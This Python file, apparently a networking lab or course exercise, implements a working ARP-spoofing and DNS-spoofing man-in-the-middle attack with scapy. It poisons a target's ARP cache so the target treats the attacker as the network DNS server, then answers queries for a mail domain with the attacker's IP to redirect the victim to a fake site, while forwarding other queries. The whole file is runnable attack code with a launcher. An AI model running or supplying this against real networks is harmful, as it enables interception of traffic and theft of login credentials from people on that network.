from typing import Dict, List
import multiprocessing as mp
from scapy.layers.l2 import getmacbyip, Ether, ARP
from scapy.layers.dns import DNS, DNSQR, DNSRR, IP, sr1, UDP
import scapy.all as scapy
import time

DOOFENSHMIRTZ_IP = "10.0.2.15"  # Enter the computer you attack's IP.
SECRATERY_IP = "10.0.2.16"  # Enter the attacker's IP.
NETWORK_DNS_SERVER_IP = "10.0.2.43"  # Enter the network's DNS server's IP.
SPOOF_SLEEP_TIME = 2

IFACE = "eth0"

FAKE_GMAIL_IP = SECRATERY_IP  # The ip on which we run
DNS_FILTER = f"udp port 53 and ip src {DOOFENSHMIRTZ_IP} and ip dst {NETWORK_DNS_SERVER_IP}"  # Scapy filter
REAL_DNS_SERVER_IP = "8.8.8.8"  # The server we use to get real DNS responses.
SPOOF_DICT = {  # This dictionary tells us which host names our DNS server needs to fake, and which ips should it give.
    b"mail.doofle.com": FAKE_GMAIL_IP
}


class ArpSpoofer(object):
    """
    An ARP Spoofing process. Sends periodical ARP responses to given target
    in order to convince it we are a specific ip (e.g: default gateway).
    """

    def __init__(self,
                 process_list: List[mp.Process],
                 target_ip: str, spoof_ip: str) -> None:
        """
        Initializer for the arp spoofer process.
        @param process_list global list of processes to append our process to.
        @param target_ip ip to spoof
        @param spoof_ip ip we want to convince the target we have.
        """
        process_list.append(self)
        self.process = None

        self.target_ip = target_ip
        self.spoof_ip = spoof_ip
        self.target_mac = None
        self.spoof_count = 0

    def get_target_mac(self) -> str:
        """
        Returns the mac address of the target.
        If not initialized yet, sends an ARP request to the target and waits for a response.
        @return the mac address of the target.
        """
        # if already initialized, return the mac address
        if self.target_mac:
            return self.target_mac
        #else send an ARP request to the target and wait for a response
        # create ARP request for the target ip
        arp_request = ARP(pdst=self.target_ip)
        # create a broadcast packet to send the ARP request to all devices in the network
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        # combine the ARP request and the broadcast packet to create the final packet to send
        arp_request_broadcast = broadcast / arp_request
        # send the packet and wait for a response
        # The srp function returns a tuple of two lists: the first list contains the answered packets, and the second list contains the unanswered packets.
        # We are only interested in the answered packets, so we take the first element of the tuple.
        answered_list = scapy.srp(arp_request_broadcast, timeout=2, iface=IFACE, verbose=False)[0]
        # If we received a response, we can extract the target's mac address from the response packet. The response packet is a tuple of two elements: the first element is the sent packet, and the second element is the received packet. We can access the received packet using the index 1, and then we can access the source hardware address (hwsrc) field of the ARP layer to get the target's mac address.
        if answered_list:
            # If we received a response, we can extract the target's mac address from the response packet. The response packet is a tuple of two elements: the first element is the sent packet, and the second element is the received packet. We can access the received packet using the index 1, and then we can access the source hardware address (hwsrc) field of the ARP layer to get the target's mac address.
            self.target_mac = answered_list[0][1].hwsrc
            return self.target_mac
        raise Exception(f"Could not get target mac address for {self.target_ip}")

    def spoof(self) -> None:
        """
        Sends an ARP spoof that convinces target_ip that we are spoof_ip.
        Increases spoof count b y one.
        """        
        # get the target's mac address, if not initialized yet, this will send an ARP request to the target and wait for a response
        target_mac = self.get_target_mac()
        # create an ARP response packet that convinces the target that we are the spoof_ip
        # op field of 2 means it's an ARP response, pdst is the target ip, hwdst is the target mac, psrc is the spoof ip
        arp_response = Ether(dst=target_mac) / ARP(op=2, pdst=self.target_ip, hwdst=target_mac, psrc=self.spoof_ip)
        # send the ARP response packet to the target
        scapy.sendp(arp_response, iface=IFACE, verbose=False)
        # increase the spoof count by one
        self.spoof_count += 1

    def run(self) -> None:
        """
        Main loop of the process.
        """
        while True:
            self.spoof()
            time.sleep(SPOOF_SLEEP_TIME)

    def start(self) -> None:
        """
        Starts the ARP spoof process.
        """
        p = mp.Process(target=self.run)
        self.process = p
        self.process.start()


class DnsHandler(object):
    """
    A DNS request server process. Forwards some of the DNS requests to the
    default servers. However for specific domains this handler returns fake crafted
    DNS responses.
    """

    def __init__(self,
                 process_list: List[mp.Process],
                 spoof_dict: Dict[str, str]):
        """
        Initializer for the dns server process.
        @param process_list global list of processes to append our process to.
        @param spoof_dict dictionary of spoofs.
            The keys: represent the domains we wish to fake,
            The values: represent the fake responses we want
                        from the domains.
        """
        process_list.append(self)
        self.process = None

        self.spoof_dict = spoof_dict
        self.real_dns_server_ip = REAL_DNS_SERVER_IP

    def get_real_dns_response(self, pkt: scapy.packet.Packet) -> scapy.packet.Packet:
        """
        Returns the real DNS response to the given DNS request.
        Asks the default DNS servers (8.8.8.8) and forwards the response, only modifying
        the IP (change it to local IP).

        @param pkt DNS request from target.
        @return DNS response to pkt, source IP changed.
        """
        # first, we send it to the real DNS server, and wait for a response
        dns_request = IP(dst=self.real_dns_server_ip) / UDP(sport= pkt[UDP].sport ,dport=53) / DNS(rd=1, qd=pkt[DNS].qd)
        response = sr1(dns_request, timeout=2, verbose=False)
        # if we received a response, we can modify the source IP of the response to be
        # our local IP, and then we can return the modified response
        if response:
            response[IP].src = pkt[IP].dst
            response[IP].dst = pkt[IP].src
            # we also need to delete the length and checksum fields of the IP and UDP layers,
            # because they will be recalculated when we send the packet
            del response[IP].len
            del response[IP].chksum
            del response[UDP].len
            del response[UDP].chksum
            return response
        raise Exception(f"Could not get real DNS response for {pkt[DNS].qd.qname.decode()} from real DNS server {self.real_dns_server_ip}")

    def get_spoofed_dns_response(self, pkt: scapy.packet.Packet, to: str) -> scapy.packet.Packet:
        """
        Returns a fake DNS response to the given DNS request.
        Crafts a DNS response leading to the ip adress 'to' (parameter).

        @param pkt DNS request from target.
        @param to ip address to return from the DNS lookup.
        @return fake DNS response to the request.
        """
        # the source IP becomes the destination IP.
        ip_layer = IP(src=pkt[IP].dst, dst=pkt[IP].src)
        # the source port becomes the destination port, and the destination port becomes 53
        udp_layer = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
        # the DNS respose is harder
        dns_layer = DNS(
            id=pkt[DNS].id,  # we need to keep the same ID as the request, so the target will accept the response
            qr=1,  # this is a response
            aa=1, # this is an authoritative answer
            rd=pkt[DNS].rd,
            ra=1,
            qd=pkt[DNS].qd,
            ancount=1,
            an=DNSRR(rrname=pkt[DNS].qd.qname, rdata=to) # the answer section contains a single record, with the same name as the request, and the IP address we want to return as the response
        )
        spoofed_pkt = ip_layer / udp_layer / dns_layer
        return spoofed_pkt


    def resolve_packet(self, pkt: scapy.packet.Packet) -> str:
        """
        Main handler for DNS requests. Based on the spoof_dict, decides if the packet
        should be forwarded to real dns server or should be treated with a crafted response.
        Calls either get_real_dns_response or get_spoofed_dns_response accordingly.

        @param pkt DNS request from target.
        @return string describing the choice made
        """
        # we first check if the requested domain is in the spoof_dict, if it is, we return a spoofed response, otherwise we return a real response
        requested_domain = pkt[DNS].qd.qname.rstrip(b".").lower()
        if requested_domain in self.spoof_dict:
            to_ip = self.spoof_dict[requested_domain]
            spoofed_response = self.get_spoofed_dns_response(pkt, to_ip)
            scapy.send(spoofed_response, verbose=False)
            return f"Spoofed DNS response for {requested_domain.decode()} with IP {to_ip}"
        else:
            real_response = self.get_real_dns_response(pkt)
            if real_response:
                scapy.send(real_response, verbose=False)
                return f"Forwarded DNS request for {requested_domain.decode()} to real DNS server and sent back the response"
            else:
                return f"Failed to get real DNS response for {requested_domain.decode()} from real DNS server"

    def run(self) -> None:
        """
        Main loop of the process. Sniffs for packets on the interface and sends DNS
        requests to resolve_packet. For every packet which passes the filter, self.resolve_packet
        is called and the return value is printed to the console.
        """
        while True:
            try:
                scapy.sniff(filter=DNS_FILTER, prn=self.resolve_packet)
            except:
                import traceback
                traceback.print_exc()

    def start(self) -> None:
        """
        Starts the DNS server process.
        """
        p = mp.Process(target=self.run)
        self.process = p
        self.process.start()


if __name__ == "__main__":
    plist = []
    spoofer = ArpSpoofer(plist, DOOFENSHMIRTZ_IP, NETWORK_DNS_SERVER_IP)
    server = DnsHandler(plist, SPOOF_DICT)

    print("Starting sub-processes...")
    server.start()
    spoofer.start()
